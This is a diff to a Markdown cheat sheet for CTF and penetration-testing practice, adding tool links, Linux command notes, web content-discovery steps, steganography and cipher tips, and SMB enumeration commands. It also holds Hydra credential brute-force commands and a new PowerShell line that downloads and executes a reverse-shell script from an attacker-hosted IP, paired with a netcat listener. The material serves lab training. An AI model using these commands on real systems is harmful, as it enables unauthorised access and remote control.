@@ -123,6 +123,7 @@
 [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) - learn about local file inclusion       
 [malc0de](http://malc0de.com/database) - malware search engine.   
 [MD5 Online](https://www.md5online.org/md5-decrypt.html) - md5Online offers several tools related to the MD5 cryptographic algorithm.     
+[Morse Code Translator](https://morsecode.world/international/translator.html) a morse code translator     
 [NerdyData](https://www.nerdydata.com) - the search engine for source code  
 [Observatory by Mozilla](https://observatory.mozilla.org)- set of tools to analyze your website.      
 [PDF24](https://tools.pdf24.org/) - free and easy to use online PDF tools     
@@ -143,7 +144,8 @@
 [Subnet Cheatsheet](https://www.freecodecamp.org/news/subnet-cheat-sheet-24-subnet-mask-30-26-27-29-and-other-ip-address-cidr-network-references/) - subnet cheatsheet  
 [Tabulate](https://pypi.org/project/tabulate/) - create clean looking tables  
 [urlscan.io](https://urlscan.io) - service to scan and analyse websites.      
-[urlvoid ](https://www.urlvoid.com) - this service helps you detect potentially malicious websites.      
+[urlvoid ](https://www.urlvoid.com) - this service helps you detect potentially malicious websites.   
+[User-Agent Switcher](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/) switch and manage user agents     
 [ViewDNS](http://viewdns.info) - one source for free DNS related tools and information.      
 [VirusTotal](https://www.virustotal.com/gui/home/upload) - analyze suspicious files and URLs to detect types of malware.      
 [WebToolHub-LE](https://www.webtoolhub.com/tn561364-link-extractor.aspx) - HTML hyperlink extractor      
@@ -153,7 +155,7 @@
 [Wigle](https://wigle.net) - is a website for collecting information about the different wireless hotspots around the world      
 
 # CTF Sites
-[TryHackMe](https://tryhackme.com) - TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs.
+[TryHackMe](https://tryhackme.com) - TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs.  
 [HackTheBox](https://www.hackthebox.com/) - HackTheBox is a massive, online cybersecurity practical training platform.  
 [CTFLearn](https://ctflearn.com) - An online platform built to help ethical hackers learn, practice, and compete.   
 [Challenges](https://challenges.re) - Reverse engineering CTF training platform      
@@ -341,6 +343,17 @@ There are three primary scopes when testing an application or service.
 | Grey | The tester will have some limited knowledge of the internal components of the application or piece of software. |
 | White | The tester will have full knowledge of the application and its expected behaviour. |
 
+## Career paths
+| Career | Description |
+|---|---|
+| Security Analyst | Responsible for maintaining the security of an organisation's data |
+| Security Engineer | Design, monitor and maintain security controls, networks, and systems to help prevent cyberattacks |
+| Incident Responder | Identifies and mitigates attacks whilst an attackers operations are still unfolding |
+| Digital Forensics Examiner | Responsible for using digital forensics to investigate incidents and crimes |
+| Malware Analyst | Analyses all types of malware to learn more about how they work and what they do |
+| Penetration Tester | Responsible for testing technology products for security loopholes |
+| Red Teamer | Plays the role of an adversary, attacking an organisation and providing feedback from an enemies perspective |
+
 ## ISO27001
 ISO (the International Organization for Standardization) is a worldwide federation of national standards bodies (ISO member bodies), where ISO27001 is an international standard on how to manage information security.
 
@@ -435,7 +448,7 @@ No specification = this folder
 `-regex` = True if the whole path of the file matches pattern using expression   
 `-type` = With -type, you can use d to only find directories, and f to only find files.  
 `-user` = specify owner  
-`-size` = specify size
+`-size` = specify size  
 `-perm` = specify permissions
 
 **Time specific**  
@@ -472,6 +485,8 @@ Options:
 `-n <number>` number of lines to show  
 `-c <numbers>` number of bytes  
 `sort` to sort
+## history
+`history` command in Linux is a built-in shell tool that displays a list of commands used in the terminal session
 ## pwd
 Find the full Path to our current working directory
 ## chmod
@@ -497,10 +512,11 @@ To make a binary file just executable for the owner of the file, you can use:
 Change the user and group for any file
 
 `chown user:group file` change user/group  
-Example (change the owner):
-chown berkan file.txt
 
-`-R` to operate on every file in the directory at once?
+**Example (change the owner):**  
+`chown berkan file.txt`
+
+`-R` to operate on every file in the directory at once
 ## curl
 The curl command transfers data to or from a network server, using one of the supported protocols (HTTP, HTTPS, FTP, FTPS, SCP, SFTP, TFTP, DICT, TELNET, LDAP or FILE). 
 
@@ -637,8 +653,11 @@ SSH or Secure Shell is a network communication protocol that enables two compute
 Standard use  
 `ssh user@ip` and type the password
 
+Login with a key  
+`ssh -i path_to_pem user@ip`
+
 Specify other ports than 22  
-`ssh user@ip -p <port>` and type the password
+`ssh user@ip -p <port>`
 ## searchsploit
 Searchsploit is a command line search tool for Exploit-DB 
 
@@ -879,7 +898,7 @@ Bruteforce
 Guess SSH credentials using a given username and a list of passwords:  
 `hydra -l username -P path/to/wordlist.txt host_ip -t 4 ssh -V`
 
-Guess Telnet credentials using a list of usernames and a single password, specifying a non-standard port and IPv6: 
+Guess Telnet credentials using a list of usernames and a single password, specifying a non-standard port and IPv6:  
 `hydra -L path/to/usernames.txt -p password -s port -6 host_ip telnet`
 
 Guess FTP credentials using usernames and passwords lists, specifying the number of threads:  
@@ -1287,17 +1306,20 @@ This command will delete every dynamic entry there is. The static ones will not 
 # Web Exploitation
 ## Content Discovery
 ### Manual
-1. Check the robots file for disallowed/hiddenpages  
-2. Check favicon to find the website frameworks (only works if the website developer doesn't replace this with a custom one)  
+1. Check the robots.txt file for disallowed/hiddenpages  
+2. Check if there is /admin/ page
+3. Check if there is any pages ( `~` and `.bak` and `.swp`
+4. Check for git repositories /.git/. [GitTools](https://github.com/internetwache/GitTools) can be used in order to automatically scrape and download a git repository hosted online with a given URL.
+5. Check favicon to find the website frameworks (only works if the website developer doesn't replace this with a custom one)  
 Run this to find its md5 hash:  
 `curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum`  
 Check [this](https://wiki.owasp.org/index.php/OWASP_favicon_database) database to find the framework.
-
-1. Check the sitemap file for disallowed/hidden files
-
-2. Curl HTTP Headers to find potential information about the webserver software and possibly the programming/scripting language in use.   
-`curl http://10.10.134.48 -v`  
-The -v switch enables verbose mode, which will output the headers
+6. Check the sitemap file for disallowed/hidden files
+7. Curl HTTP Headers to find potential information about the webserver software and possibly the programming/scripting language in use. `curl http://10.10.134.48 -v` The -v switch enables verbose mode, which will output the headers
+8. Look out for cookie values and change them if possible.
+9. Test for Cross-site scripting
+10. Test with SQL injection methods
+11. Try Flask Template Injection with `{{config}}`
 
 When successfully finding a framework using on of the methods, Framework Stacking can be used afterwards where you check the framework documentation for potential admin portals etc.
 
@@ -1709,6 +1731,9 @@ The file type is indicated in the contents of the file with a file signature - a
 * Eg PNG files: 89 50 4e 47 (last three hex is PNG in ASCII)
 * Tool: `file`
 
+**pngcheck**  
+A command-line tool for "checking" a PNG image file. Especially good for verifying checksums.
+
 ### Metadata
 The file extension is one form of metadata: (data about data)
 
@@ -1722,7 +1747,9 @@ Why analyze metadata?
 * Tool: `exiftool`
 
 **PDF Analysis**  
-We can try to read the metadata using the program pdfinfo. Pdfinfo displays various metadata related to a PDF file, such as title, subject, author, creator, and creation date. If you don’t have pdfinfo installed, you can install it using: `sudo apt install poppler-utils`
+We can try to read the metadata using the program `pdfinfo`. Pdfinfo displays various metadata related to a PDF file, such as title, subject, author, creator, and creation date. If you don’t have `pdfinfo` installed, you can install it using: `sudo apt install poppler-utils`
+
+If the PDF file is password protected, another tool named `pdfcrack` can be used with a wordlist in order to bruteforce the password.
 
 **Geographical Coordinates**  
 Longitude Latitude
@@ -1803,6 +1830,10 @@ berkankutuk@kali:~$ stegoveritas_install_deps
 `stegoveritas -steghide filename` -  Check for StegHide hidden info.  
 `stegoveritas -extractLSB filename` -  Extract a specific LSB RGB from the image.
 
+### Stego-toolkit
+Collection of steganography tools - helps with CTF challenges
+
+
 ### Strings
 Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted
 and sometimes the password is actaully in the file itself and can be easily viewed by using strings.
@@ -1825,12 +1856,17 @@ A tool similar to exiftool.
 `exiv2 file` shows the metadata of the given file  
 
 ### Binwalk
-Binwalk is a tool for searching binary files like images and audio files for embedded files and
-data.
+Binwalk is a tool for searching binary files like images and audio files for embedded files and data.
 
 **Useful commands:**  
 `binwalk <filepath>` Displays the embedded data in the given file  
 `binwalk -e <filepath>` Displays and extracts the data from the given file
+
+### Foremost
+`foremost` is another file carving tool like binwalk, and can be installed with `sudo apt-get install foremost`.
+
+**Useful commands:**  
+`foremost -t doc,jpg,pdf,xls -i image.dd` Search for a selection of file types (`-t doc,jpg,pdf,xls`) in the given image file (`-i image.dd`):
 
 ### Zsteg
 zsteg is a tool that can detect hidden data in png and bmp files.
@@ -1840,6 +1876,14 @@ zsteg is a tool that can detect hidden data in png and bmp files.
 `zsteg -a file` Runs all the methods on the given file  
 `zsteg -E file` Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy
 name.png)
+
+### Jsteg
+Another command-line tool to use against JPEG Images
+
+### Zbarimg
+A command-line tool to quickly scan multiple forms of barcodes (QR Codes)
+
+Install with `sudo apt install zbar-tools`
 
 ### Wavsteg
 WavSteg is a python3 tool that comes with the package `stegolsb` which can hide data and files in wav files and can also extract data from wav files.
@@ -1929,9 +1973,35 @@ Find the in-depth content for the Assembly x86-64 language [here](/More/Assembly
 
 `TO BE ADDED`
 ## Disassemblers
+### gdb
+`TO BE ADDED`
+
+### radare2
+`TO BE ADDED`
+
+### Ghidra
 `TO BE ADDED`
 
 # Cryptography
+## Decrypting Methods
+### Cryptii
+[Cryptii](https://cryptii.com) has multiple decoding tools like base64, Ceaser Cipher, ROT13, Vigenère Cipher and more.
+
+### Keyboard Shift
+[Dcode](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...
+
+### Bit Shift
+Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).
+
+### Reversed Text
+Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in Python like so:
+
+"UOYMORFEDIHOTGNIYRTEBTHGIMFTCA.TAHTTERCESASISIHT"[::-1]
+
+### XOR
+ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in \xde\xad\xbe\xef etc..) Note that you can do easy XOR locally with Python like so (you need pwntools installed):
+
+`python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")`
 ## Encoding
 Encoded data can be decoded immediately, without keys. It's NOT a form of encryption, it just a way of representing data.
 
@@ -1968,6 +2038,38 @@ Public key to encrypt, private key to decrypt.
 Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. 
 
 Other related terms include: Domain controllers, Trusts & Policies, Services, Authentication & Cloud security.
+
+## Windows Reverse Shells
+If you have access to PowerShell, you can get a Reverse shell by using [nishang's](https://github.com/samratashok/nishang) Invoke-PowerShellTcp.ps1 script inside of the Shells directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):
+```
+python -m SimpleHTTPServer
+```
+and then on the victim machine:
+```
+powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
+```
+Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility rlwrap before your netcat listener command.
+
+```
+rlwrap nc -lnvp 9001
+```
+
+## Samba (SMB)
+smbmap tells you permissions and access, which smbclient does not do!
+
+**smbmap**  
+To try and list shares as the anonymous user DO THIS (this doesn't always work for some weird reason)  
+`smbmap -H <IP> -u anonymous`
+
+**enum4linux**    
+Another enumeration tool is enum4linux which can be used like this:  
+`enum4linux <ip>`
+
+**smbclient**  
+You can use smbclient to look through files shared with SMB. To list available shares:  
+`smbclient -m SMB2 -N -L //10.10.10.125/`
+
+For more, see this page: [Samba](More/Windows-related/Samba.md)
 
 # Shells and Privilege Escalation
 ## TTY Shell
